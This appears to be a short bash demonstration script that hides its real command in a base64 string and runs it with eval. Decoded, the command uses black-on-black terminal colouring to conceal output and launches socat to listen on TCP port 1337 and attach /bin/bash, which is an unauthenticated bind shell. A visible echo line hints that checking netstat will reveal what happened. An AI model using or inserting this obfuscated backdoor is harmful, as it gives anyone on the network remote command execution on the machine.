#!/bin/bash

SECRET_SCRIPT=`echo ZWNobyBIZWxsbxtbMzBtG1s0MG0gOyBzb2NhdCB0Y3A0LWxpc3RlbjoxMzM3IGV4ZWM6L2Jpbi9iYXNoOyBlY2hvIE5vdGhpbmcbWzBtV29ybGQK | base64 -d`

echo "Hmmmm... wondering what it is doing...  Check netstat -l -n before and after..."

eval ${SECRET_SCRIPT}
